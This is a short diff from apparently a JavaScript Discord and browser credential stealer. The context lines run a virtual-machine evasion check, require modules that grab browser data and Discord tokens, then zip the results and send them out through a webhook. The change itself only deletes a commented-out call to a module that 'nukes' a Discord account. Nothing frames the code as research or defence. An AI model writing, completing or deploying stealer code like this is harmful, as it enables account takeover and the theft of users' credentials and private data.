@@ -28,8 +28,6 @@ if (config.vmProtect && checkVM()) {
     require('./functions/grab-browsers-data');
 
     require('./functions/grab-discord-token').then(async () => {
-      //require('./functions/nuke-discord-account');
-
       await sleep(500);
       require('./functions/zip').then(require('./functions/webhook'));
     });
